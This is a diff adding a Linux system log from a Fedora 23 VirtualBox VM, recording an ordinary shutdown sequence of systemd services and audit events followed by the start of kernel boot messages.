@@ -1,0 +1,1145 @@
+Dec 14 01:37:07 localhost rsyslogd: [origin software="rsyslogd" swVersion="8.10.0" x-pid="667" x-info="http://www.rsyslog.com"] start
+Dec 14 01:35:32 localhost systemd: pam_unix(systemd-user:session): session closed for user root
+Dec 14 01:35:32 localhost systemd: Received SIGRTMIN+24 from PID 1109 (kill).
+Dec 14 01:35:32 localhost audit: USER_END pid=960 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:session_close grantors=pam_keyinit,pam_limits,pam_systemd,pam_unix acct="root" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:35:32 localhost NetworkManager[655]: <warn>  disconnected by the system bus.
+Dec 14 01:35:32 localhost systemd: Stopping irqbalance daemon...
+Dec 14 01:35:32 localhost systemd: Stopping System Logging Service...
+Dec 14 01:35:32 localhost systemd: Stopping The Apache HTTP Server...
+Dec 14 01:35:32 localhost systemd: Stopped Hardware RNG Entropy Gatherer Daemon.
+Dec 14 01:35:32 localhost audit: SERVICE_STOP pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=rngd comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:35:32 localhost systemd: Stopped Machine Check Exception Logging Daemon.
+Dec 14 01:35:32 localhost audit: SERVICE_STOP pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=mcelog comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:35:32 localhost systemd: Stopped Job spooling tools.
+Dec 14 01:35:32 localhost audit: SERVICE_STOP pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=atd comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:35:32 localhost crond[704]: (CRON) INFO (Shutting down)
+Dec 14 01:35:32 localhost systemd: Stopped Getty on tty1.
+Dec 14 01:35:32 localhost audit: SERVICE_STOP pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=getty@tty1 comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:35:32 localhost systemd: Stopped irqbalance daemon.
+Dec 14 01:35:32 localhost audit: SERVICE_STOP pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=irqbalance comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:35:32 localhost NetworkManager[655]: <info>  caught SIGTERM, shutting down normally.
+Dec 14 01:35:32 localhost systemd: Stopped D-Bus System Message Bus.
+Dec 14 01:35:32 localhost audit: SERVICE_STOP pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=dbus comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:35:32 localhost sshd[686]: Received signal 15; terminating.
+Dec 14 01:35:32 localhost systemd: Stopped Command Scheduler.
+Dec 14 01:35:32 localhost audit: SERVICE_STOP pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=crond comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:35:32 localhost systemd: Stopped User Manager for UID 0.
+Dec 14 01:35:32 localhost audit: SERVICE_STOP pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=user@0 comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:35:32 localhost systemd: Stopped Session 1 of user root.
+Dec 14 01:35:32 localhost audit: SERVICE_STOP pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=dracut-shutdown comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=failed'
+Dec 14 01:35:32 localhost systemd: dracut-shutdown.service: Control process exited, code=exited status=32
+Dec 14 01:35:32 localhost systemd: Stopped Restore /run/initramfs on shutdown.
+Dec 14 01:35:32 localhost systemd: dracut-shutdown.service: Unit entered failed state.
+Dec 14 01:35:32 localhost systemd: dracut-shutdown.service: Failed with result 'exit-code'.
+Dec 14 01:35:32 localhost NetworkManager[655]: <info>  exiting (success)
+Dec 14 01:35:32 localhost systemd: Stopping Login Service...
+Dec 14 01:35:32 localhost systemd: Removed slice user-0.slice.
+Dec 14 01:35:32 localhost systemd: Stopping user-0.slice.
+Dec 14 01:35:32 localhost systemd: Stopping /etc/rc.d/rc.local Compatibility...
+Dec 14 01:35:32 localhost systemd: Removed slice system-getty.slice.
+Dec 14 01:35:32 localhost systemd: Stopping system-getty.slice.
+Dec 14 01:35:32 localhost systemd: Stopping Permit User Sessions...
+Dec 14 01:35:32 localhost systemd: Stopped /etc/rc.d/rc.local Compatibility.
+Dec 14 01:35:32 localhost audit: SERVICE_STOP pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=rc-local comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:35:32 localhost audit: CRYPTO_KEY_USER pid=686 uid=0 auid=4294967295 ses=4294967295 msg='op=destroy kind=server fp=SHA256:55:7e:f1:22:af:6d:02:f2:79:13:e3:cf:60:6d:c3:f7:4b:aa:69:49:aa:45:64:c6:6e:34:d3:99:93:e0:b9:ac direction=? spid=686 suid=0  exe="/usr/sbin/sshd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:35:32 localhost audit: CRYPTO_KEY_USER pid=686 uid=0 auid=4294967295 ses=4294967295 msg='op=destroy kind=server fp=SHA256:85:01:8a:71:7c:fb:c5:51:b5:b1:86:28:d3:e0:ab:1f:dd:1f:39:2f:25:95:c4:57:4d:dc:ed:c2:1c:ed:a5:47 direction=? spid=686 suid=0  exe="/usr/sbin/sshd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:35:32 localhost audit: CRYPTO_KEY_USER pid=686 uid=0 auid=4294967295 ses=4294967295 msg='op=destroy kind=server fp=SHA256:61:44:c9:0d:fa:3e:40:e9:bb:ee:66:0b:27:05:91:17:1a:53:f0:a9:60:72:c9:4f:8d:55:cd:d3:f7:2e:0d:4c direction=? spid=686 suid=0  exe="/usr/sbin/sshd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:35:32 localhost systemd: Stopped Permit User Sessions.
+Dec 14 01:35:32 localhost audit: SERVICE_STOP pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=systemd-user-sessions comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:35:32 localhost systemd: Stopped Login Service.
+Dec 14 01:35:32 localhost audit: SERVICE_STOP pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=systemd-logind comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:35:32 localhost systemd: Stopped Network Manager.
+Dec 14 01:35:32 localhost audit: SERVICE_STOP pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=NetworkManager comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:35:32 localhost systemd: Stopped OpenSSH server daemon.
+Dec 14 01:35:32 localhost audit: SERVICE_STOP pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=sshd comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:35:32 localhost systemd: Stopped System Logging Service.
+Dec 14 01:35:32 localhost audit: SERVICE_STOP pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=rsyslog comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:35:33 localhost systemd: Stopped The Apache HTTP Server.
+Dec 14 01:35:33 localhost audit: SERVICE_STOP pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=httpd comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:35:33 localhost systemd: Stopped target Remote File Systems.
+Dec 14 01:35:33 localhost systemd: Stopping Remote File Systems.
+Dec 14 01:35:33 localhost systemd: Deactivated swap /dev/disk/by-uuid/d652b117-4ccd-43b9-8cca-6af53cd0a6c2.
+Dec 14 01:35:33 localhost systemd: Deactivated swap /dev/disk/by-id/dm-uuid-LVM-4K4BfkJ0AUyaam7n9T72bLVfqIQ53OR8MPMDNehv09m0RthX4jMwJxnNBf6UVxU0.
+Dec 14 01:35:33 localhost systemd: Deactivated swap /dev/disk/by-id/dm-name-fedora-swap.
+Dec 14 01:35:33 localhost systemd: Deactivated swap /dev/dm-1.
+Dec 14 01:35:33 localhost systemd: Deactivated swap /dev/mapper/fedora-swap.
+Dec 14 01:35:34 localhost mysqld_safe: 191214 01:35:34 mysqld_safe mysqld from pid file /var/run/mariadb/mariadb.pid ended
+Dec 14 01:35:34 localhost systemd: Stopped MariaDB 10.0 database server.
+Dec 14 01:35:34 localhost audit: SERVICE_STOP pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=mariadb comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:35:34 localhost systemd: Stopped target Basic System.
+Dec 14 01:35:34 localhost systemd: Stopping Basic System.
+Dec 14 01:35:34 localhost systemd: Stopped dnf makecache timer.
+Dec 14 01:35:34 localhost systemd: Stopping dnf makecache timer.
+Dec 14 01:35:34 localhost systemd: Stopped target Paths.
+Dec 14 01:35:34 localhost systemd: Stopping Paths.
+Dec 14 01:35:34 localhost systemd: Stopped Forward Password Requests to Wall Directory Watch.
+Dec 14 01:35:34 localhost systemd: Stopping Forward Password Requests to Wall Directory Watch.
+Dec 14 01:35:34 localhost systemd: Stopped target Sockets.
+Dec 14 01:35:34 localhost systemd: Stopping Sockets.
+Dec 14 01:35:34 localhost systemd: Closed PC/SC Smart Card Daemon Activation Socket.
+Dec 14 01:35:34 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=systemd-vconsole-setup comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:35:34 localhost systemd: Stopping PC/SC Smart Card Daemon Activation Socket.
+Dec 14 01:35:34 localhost audit: SERVICE_STOP pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=systemd-vconsole-setup comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:35:34 localhost systemd: Closed D-Bus System Message Bus Socket.
+Dec 14 01:35:34 localhost audit: SERVICE_STOP pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=systemd-sysctl comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:35:34 localhost systemd: Stopping D-Bus System Message Bus Socket.
+Dec 14 01:35:34 localhost systemd: Stopped target System Initialization.
+Dec 14 01:35:34 localhost systemd: Stopping System Initialization.
+Dec 14 01:35:34 localhost systemd: Stopping Load/Save Random Seed...
+Dec 14 01:35:34 localhost systemd: Stopped Setup Virtual Console.
+Dec 14 01:35:34 localhost systemd: Stopping Setup Virtual Console...
+Dec 14 01:35:34 localhost systemd: Stopped Apply Kernel Variables.
+Dec 14 01:35:34 localhost systemd: Stopping Apply Kernel Variables...
+Dec 14 01:35:34 localhost systemd: Stopped target Swap.
+Dec 14 01:35:34 localhost systemd: Stopping Swap.
+Dec 14 01:35:34 localhost systemd: Stopping Update UTMP about System Boot/Shutdown...
+Dec 14 01:35:34 localhost systemd: Stopped target Encrypted Volumes.
+Dec 14 01:35:34 localhost systemd: Stopping Encrypted Volumes.
+Dec 14 01:35:34 localhost systemd: Stopped target Slices.
+Dec 14 01:35:34 localhost systemd: Stopping Slices.
+Dec 14 01:35:34 localhost systemd: Removed slice User and Session Slice.
+Dec 14 01:35:34 localhost systemd: Stopping User and Session Slice.
+Dec 14 01:35:34 localhost systemd: Stopped target Network.
+Dec 14 01:35:34 localhost systemd: Stopping Network.
+Dec 14 01:35:34 localhost audit: SYSTEM_SHUTDOWN pid=1168 uid=0 auid=4294967295 ses=4294967295 msg=' comm="systemd-update-utmp" exe="/usr/lib/systemd/systemd-update-utmp" hostname=? addr=? terminal=? res=success'
+Dec 14 01:35:34 localhost systemd: Stopped Update UTMP about System Boot/Shutdown.
+Dec 14 01:35:34 localhost audit: SERVICE_STOP pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=systemd-update-utmp comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:35:34 localhost systemd: Stopping Security Auditing Service...
+Dec 14 01:35:34 localhost systemd: Stopped Load/Save Random Seed.
+Dec 14 01:35:34 localhost audit: SERVICE_STOP pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=systemd-random-seed comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:35:34 localhost auditd[641]: The audit daemon is exiting.
+Dec 14 01:35:34 localhost audit: CONFIG_CHANGE audit_pid=0 old=641 auid=4294967295 ses=4294967295 res=1
+Dec 14 01:35:34 localhost systemd: Stopped Security Auditing Service.
+Dec 14 01:35:34 localhost audit: SERVICE_STOP pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=auditd comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:35:34 localhost systemd: Stopped Create Volatile Files and Directories.
+Dec 14 01:35:34 localhost kernel: audit_printk_skb: 177 callbacks suppressed
+Dec 14 01:35:34 localhost kernel: audit: type=1305 audit(1576287334.606:135): audit_pid=0 old=641 auid=4294967295 ses=4294967295 res=1
+Dec 14 01:35:34 localhost kernel: audit: type=1131 audit(1576287334.606:136): pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=auditd comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:35:34 localhost kernel: audit: type=1131 audit(1576287334.606:137): pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=systemd-tmpfiles-setup comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:35:34 localhost systemd: Stopping Create Volatile Files and Directories...
+Dec 14 01:35:34 localhost audit: SERVICE_STOP pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=systemd-tmpfiles-setup comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:35:34 localhost systemd: Stopped Import network configuration from initramfs.
+Dec 14 01:35:34 localhost audit: SERVICE_STOP pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=fedora-import-state comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:35:34 localhost systemd: Stopping Import network configuration from initramfs...
+Dec 14 01:35:34 localhost systemd: Stopped target Local File Systems.
+Dec 14 01:35:34 localhost systemd: Stopping Local File Systems.
+Dec 14 01:35:34 localhost systemd: Unmounting /run/user/0...
+Dec 14 01:35:34 localhost systemd: Unmounting /boot...
+Dec 14 01:35:34 localhost systemd: Unmounting Configuration File System...
+Dec 14 01:35:34 localhost systemd: Unmounting Temporary Directory...
+Dec 14 01:35:34 localhost audit: SERVICE_STOP pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=fedora-readonly comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:35:34 localhost systemd: Stopped Configure read-only root support.
+Dec 14 01:35:34 localhost systemd: Stopping Configure read-only root support...
+Dec 14 01:35:34 localhost kernel: audit: type=1131 audit(1576287334.607:138): pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=fedora-import-state comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:35:34 localhost kernel: audit: type=1131 audit(1576287334.607:139): pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=fedora-readonly comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:35:34 localhost systemd: Unmounted /run/user/0.
+Dec 14 01:35:34 localhost systemd: Unmounted /boot.
+Dec 14 01:35:34 localhost systemd: Stopped target Local File Systems (Pre).
+Dec 14 01:35:34 localhost systemd: Stopping Local File Systems (Pre).
+Dec 14 01:35:34 localhost audit: SERVICE_STOP pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=systemd-tmpfiles-setup-dev comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:35:34 localhost systemd: Stopped Create Static Device Nodes in /dev.
+Dec 14 01:35:34 localhost systemd: Stopping Create Static Device Nodes in /dev...
+Dec 14 01:35:34 localhost audit: SERVICE_STOP pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=systemd-remount-fs comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:35:34 localhost systemd: Stopped Remount Root and Kernel File Systems.
+Dec 14 01:35:34 localhost systemd: Stopping Remount Root and Kernel File Systems...
+Dec 14 01:35:34 localhost systemd: Reached target Shutdown.
+Dec 14 01:35:34 localhost kernel: audit: type=1131 audit(1576287334.625:140): pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=systemd-tmpfiles-setup-dev comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:35:34 localhost kernel: audit: type=1131 audit(1576287334.625:141): pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=systemd-remount-fs comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:35:34 localhost systemd: Starting Shutdown.
+Dec 14 01:35:34 localhost systemd: Unmounted Temporary Directory.
+Dec 14 01:35:34 localhost systemd: Unmounted Configuration File System.
+Dec 14 01:35:34 localhost systemd: Reached target Unmount All Filesystems.
+Dec 14 01:35:34 localhost systemd: Starting Unmount All Filesystems.
+Dec 14 01:35:34 localhost systemd: Reached target Final Step.
+Dec 14 01:35:34 localhost systemd: Starting Final Step.
+Dec 14 01:35:34 localhost systemd: Starting Power-Off...
+Dec 14 01:35:34 localhost systemd: Shutting down.
+Dec 14 01:35:34 localhost systemd-shutdown[1]: Sending SIGTERM to remaining processes...
+Dec 14 01:35:34 localhost journal: Journal stopped
+Dec 14 01:37:04 localhost journal: Runtime journal is using 4.6M (max allowed 37.0M, trying to leave 55.5M free of 365.9M available → current limit 37.0M).
+Dec 14 01:37:04 localhost journal: Runtime journal is using 4.6M (max allowed 37.0M, trying to leave 55.5M free of 365.9M available → current limit 37.0M).
+Dec 14 01:37:04 localhost kernel: Initializing cgroup subsys cpuset
+Dec 14 01:37:04 localhost kernel: Initializing cgroup subsys cpu
+Dec 14 01:37:04 localhost kernel: Initializing cgroup subsys cpuacct
+Dec 14 01:37:04 localhost kernel: Linux version 4.2.3-300.fc23.x86_64 (mockbuild@bkernel02.phx2.fedoraproject.org) (gcc version 5.1.1 20150618 (Red Hat 5.1.1-4) (GCC) ) #1 SMP Mon Oct 5 15:42:54 UTC 2015
+Dec 14 01:37:04 localhost kernel: Command line: BOOT_IMAGE=/vmlinuz-4.2.3-300.fc23.x86_64 root=/dev/mapper/fedora-root ro rd.lvm.lv=fedora/root rd.lvm.lv=fedora/swap rhgb quiet
+Dec 14 01:37:04 localhost kernel: x86/fpu: xstate_offset[2]: 0240, xstate_sizes[2]: 0100
+Dec 14 01:37:04 localhost kernel: x86/fpu: Supporting XSAVE feature 0x01: 'x87 floating point registers'
+Dec 14 01:37:04 localhost kernel: x86/fpu: Supporting XSAVE feature 0x02: 'SSE registers'
+Dec 14 01:37:04 localhost kernel: x86/fpu: Supporting XSAVE feature 0x04: 'AVX registers'
+Dec 14 01:37:04 localhost kernel: x86/fpu: Enabled xstate features 0x7, context size is 0x340 bytes, using 'standard' format.
+Dec 14 01:37:04 localhost kernel: x86/fpu: Using 'lazy' FPU context switches.
+Dec 14 01:37:04 localhost kernel: e820: BIOS-provided physical RAM map:
+Dec 14 01:37:04 localhost kernel: BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] usable
+Dec 14 01:37:04 localhost kernel: BIOS-e820: [mem 0x000000000009fc00-0x000000000009ffff] reserved
+Dec 14 01:37:04 localhost kernel: BIOS-e820: [mem 0x00000000000f0000-0x00000000000fffff] reserved
+Dec 14 01:37:04 localhost kernel: BIOS-e820: [mem 0x0000000000100000-0x000000002ffeffff] usable
+Dec 14 01:37:04 localhost kernel: BIOS-e820: [mem 0x000000002fff0000-0x000000002fffffff] ACPI data
+Dec 14 01:37:04 localhost kernel: BIOS-e820: [mem 0x00000000fec00000-0x00000000fec00fff] reserved
+Dec 14 01:37:04 localhost kernel: BIOS-e820: [mem 0x00000000fee00000-0x00000000fee00fff] reserved
+Dec 14 01:37:04 localhost kernel: BIOS-e820: [mem 0x00000000fffc0000-0x00000000ffffffff] reserved
+Dec 14 01:37:04 localhost kernel: NX (Execute Disable) protection: active
+Dec 14 01:37:04 localhost kernel: SMBIOS 2.5 present.
+Dec 14 01:37:04 localhost kernel: DMI: innotek GmbH VirtualBox/VirtualBox, BIOS VirtualBox 12/01/2006
+Dec 14 01:37:04 localhost kernel: Hypervisor detected: KVM
+Dec 14 01:37:04 localhost kernel: e820: update [mem 0x00000000-0x00000fff] usable ==> reserved
+Dec 14 01:37:04 localhost kernel: e820: remove [mem 0x000a0000-0x000fffff] usable
+Dec 14 01:37:04 localhost kernel: e820: last_pfn = 0x2fff0 max_arch_pfn = 0x400000000
+Dec 14 01:37:04 localhost kernel: MTRR default type: uncachable
+Dec 14 01:37:04 localhost kernel: MTRR variable ranges disabled:
+Dec 14 01:37:04 localhost kernel: x86/PAT: Configuration [0-7]: WB  WC  UC- UC  WB  WC  UC- WT  
+Dec 14 01:37:04 localhost kernel: MTRR: Disabled
+Dec 14 01:37:04 localhost kernel: CPU MTRRs all blank - virtualized system.
+Dec 14 01:37:04 localhost kernel: found SMP MP-table at [mem 0x0009fff0-0x0009ffff] mapped at [ffff88000009fff0]
+Dec 14 01:37:04 localhost kernel: Base memory trampoline at [ffff880000099000] 99000 size 24576
+Dec 14 01:37:04 localhost kernel: init_memory_mapping: [mem 0x00000000-0x000fffff]
+Dec 14 01:37:04 localhost kernel: [mem 0x00000000-0x000fffff] page 4k
+Dec 14 01:37:04 localhost kernel: BRK [0x02042000, 0x02042fff] PGTABLE
+Dec 14 01:37:04 localhost kernel: BRK [0x02043000, 0x02043fff] PGTABLE
+Dec 14 01:37:04 localhost kernel: BRK [0x02044000, 0x02044fff] PGTABLE
+Dec 14 01:37:04 localhost kernel: init_memory_mapping: [mem 0x2fc00000-0x2fdfffff]
+Dec 14 01:37:04 localhost kernel: [mem 0x2fc00000-0x2fdfffff] page 2M
+Dec 14 01:37:04 localhost kernel: init_memory_mapping: [mem 0x20000000-0x2fbfffff]
+Dec 14 01:37:04 localhost kernel: [mem 0x20000000-0x2fbfffff] page 2M
+Dec 14 01:37:04 localhost kernel: init_memory_mapping: [mem 0x00100000-0x1fffffff]
+Dec 14 01:37:04 localhost kernel: [mem 0x00100000-0x001fffff] page 4k
+Dec 14 01:37:04 localhost kernel: [mem 0x00200000-0x1fffffff] page 2M
+Dec 14 01:37:04 localhost kernel: init_memory_mapping: [mem 0x2fe00000-0x2ffeffff]
+Dec 14 01:37:04 localhost kernel: [mem 0x2fe00000-0x2ffeffff] page 4k
+Dec 14 01:37:04 localhost kernel: BRK [0x02045000, 0x02045fff] PGTABLE
+Dec 14 01:37:04 localhost kernel: RAMDISK: [mem 0x2e64c000-0x2f85afff]
+Dec 14 01:37:04 localhost kernel: ACPI: Early table checksum verification disabled
+Dec 14 01:37:04 localhost kernel: ACPI: RSDP 0x00000000000E0000 000024 (v02 VBOX  )
+Dec 14 01:37:04 localhost kernel: ACPI: XSDT 0x000000002FFF0030 00003C (v01 VBOX   VBOXXSDT 00000001 ASL  00000061)
+Dec 14 01:37:04 localhost kernel: ACPI: FACP 0x000000002FFF00F0 0000F4 (v04 VBOX   VBOXFACP 00000001 ASL  00000061)
+Dec 14 01:37:04 localhost kernel: ACPI: DSDT 0x000000002FFF0470 0022EA (v02 VBOX   VBOXBIOS 00000002 INTL 20191018)
+Dec 14 01:37:04 localhost kernel: ACPI: FACS 0x000000002FFF0200 000040
+Dec 14 01:37:04 localhost kernel: ACPI: FACS 0x000000002FFF0200 000040
+Dec 14 01:37:04 localhost kernel: ACPI: APIC 0x000000002FFF0240 00005C (v02 VBOX   VBOXAPIC 00000001 ASL  00000061)
+Dec 14 01:37:04 localhost kernel: ACPI: SSDT 0x000000002FFF02A0 0001CC (v01 VBOX   VBOXCPUT 00000002 INTL 20191018)
+Dec 14 01:37:04 localhost kernel: ACPI: Local APIC address 0xfee00000
+Dec 14 01:37:04 localhost kernel: No NUMA configuration found
+Dec 14 01:37:04 localhost kernel: Faking a node at [mem 0x0000000000000000-0x000000002ffeffff]
+Dec 14 01:37:04 localhost kernel: NODE_DATA(0) allocated [mem 0x2ffdc000-0x2ffeffff]
+Dec 14 01:37:04 localhost kernel: kvm-clock: Using msrs 4b564d01 and 4b564d00
+Dec 14 01:37:04 localhost kernel: kvm-clock: cpu 0, msr 0:2ffcc001, primary cpu clock
+Dec 14 01:37:04 localhost kernel: clocksource: kvm-clock: mask: 0xffffffffffffffff max_cycles: 0x1cd42e4dffb, max_idle_ns: 881590591483 ns
+Dec 14 01:37:04 localhost kernel: [ffffea0000000000-ffffea0000bfffff] PMD -> [ffff88002d600000-ffff88002e1fffff] on node 0
+Dec 14 01:37:04 localhost kernel: Zone ranges:
+Dec 14 01:37:04 localhost kernel:  DMA      [mem 0x0000000000001000-0x0000000000ffffff]
+Dec 14 01:37:04 localhost kernel:  DMA32    [mem 0x0000000001000000-0x000000002ffeffff]
+Dec 14 01:37:04 localhost kernel:  Normal   empty
+Dec 14 01:37:04 localhost kernel: Movable zone start for each node
+Dec 14 01:37:04 localhost kernel: Early memory node ranges
+Dec 14 01:37:04 localhost kernel:  node   0: [mem 0x0000000000001000-0x000000000009efff]
+Dec 14 01:37:04 localhost kernel:  node   0: [mem 0x0000000000100000-0x000000002ffeffff]
+Dec 14 01:37:04 localhost kernel: Initmem setup node 0 [mem 0x0000000000001000-0x000000002ffeffff]
+Dec 14 01:37:04 localhost kernel: On node 0 totalpages: 196494
+Dec 14 01:37:04 localhost kernel:  DMA zone: 64 pages used for memmap
+Dec 14 01:37:04 localhost kernel:  DMA zone: 21 pages reserved
+Dec 14 01:37:04 localhost kernel:  DMA zone: 3998 pages, LIFO batch:0
+Dec 14 01:37:04 localhost kernel:  DMA32 zone: 3008 pages used for memmap
+Dec 14 01:37:04 localhost kernel:  DMA32 zone: 192496 pages, LIFO batch:31
+Dec 14 01:37:04 localhost kernel: ACPI: PM-Timer IO Port: 0x4008
+Dec 14 01:37:04 localhost kernel: ACPI: Local APIC address 0xfee00000
+Dec 14 01:37:04 localhost kernel: IOAPIC[0]: apic_id 2, version 32, address 0xfec00000, GSI 0-23
+Dec 14 01:37:04 localhost kernel: ACPI: INT_SRC_OVR (bus 0 bus_irq 0 global_irq 2 dfl dfl)
+Dec 14 01:37:04 localhost kernel: ACPI: INT_SRC_OVR (bus 0 bus_irq 9 global_irq 9 low level)
+Dec 14 01:37:04 localhost kernel: ACPI: IRQ0 used by override.
+Dec 14 01:37:04 localhost kernel: ACPI: IRQ9 used by override.
+Dec 14 01:37:04 localhost kernel: Using ACPI (MADT) for SMP configuration information
+Dec 14 01:37:04 localhost kernel: smpboot: Allowing 2 CPUs, 0 hotplug CPUs
+Dec 14 01:37:04 localhost kernel: PM: Registered nosave memory: [mem 0x00000000-0x00000fff]
+Dec 14 01:37:04 localhost kernel: PM: Registered nosave memory: [mem 0x0009f000-0x0009ffff]
+Dec 14 01:37:04 localhost kernel: PM: Registered nosave memory: [mem 0x000a0000-0x000effff]
+Dec 14 01:37:04 localhost kernel: PM: Registered nosave memory: [mem 0x000f0000-0x000fffff]
+Dec 14 01:37:04 localhost kernel: e820: [mem 0x30000000-0xfebfffff] available for PCI devices
+Dec 14 01:37:04 localhost kernel: Booting paravirtualized kernel on KVM
+Dec 14 01:37:04 localhost kernel: clocksource: refined-jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1910969940391419 ns
+Dec 14 01:37:04 localhost kernel: setup_percpu: NR_CPUS:1024 nr_cpumask_bits:2 nr_cpu_ids:2 nr_node_ids:1
+Dec 14 01:37:04 localhost kernel: PERCPU: Embedded 33 pages/cpu @ffff88002fc00000 s97048 r8192 d29928 u1048576
+Dec 14 01:37:04 localhost kernel: pcpu-alloc: s97048 r8192 d29928 u1048576 alloc=1*2097152
+Dec 14 01:37:04 localhost kernel: pcpu-alloc: [0] 0 1 
+Dec 14 01:37:04 localhost kernel: Built 1 zonelists in Node order, mobility grouping on.  Total pages: 193401
+Dec 14 01:37:04 localhost kernel: Policy zone: DMA32
+Dec 14 01:37:04 localhost kernel: Kernel command line: BOOT_IMAGE=/vmlinuz-4.2.3-300.fc23.x86_64 root=/dev/mapper/fedora-root ro rd.lvm.lv=fedora/root rd.lvm.lv=fedora/swap rhgb quiet
+Dec 14 01:37:04 localhost kernel: PID hash table entries: 4096 (order: 3, 32768 bytes)
+Dec 14 01:37:04 localhost kernel: Memory: 737780K/785976K available (7670K kernel code, 1264K rwdata, 3336K rodata, 1508K init, 1544K bss, 48196K reserved, 0K cma-reserved)
+Dec 14 01:37:04 localhost kernel: SLUB: HWalign=64, Order=0-3, MinObjects=0, CPUs=2, Nodes=1
+Dec 14 01:37:04 localhost kernel: Hierarchical RCU implementation.
+Dec 14 01:37:04 localhost kernel: #011Build-time adjustment of leaf fanout to 64.
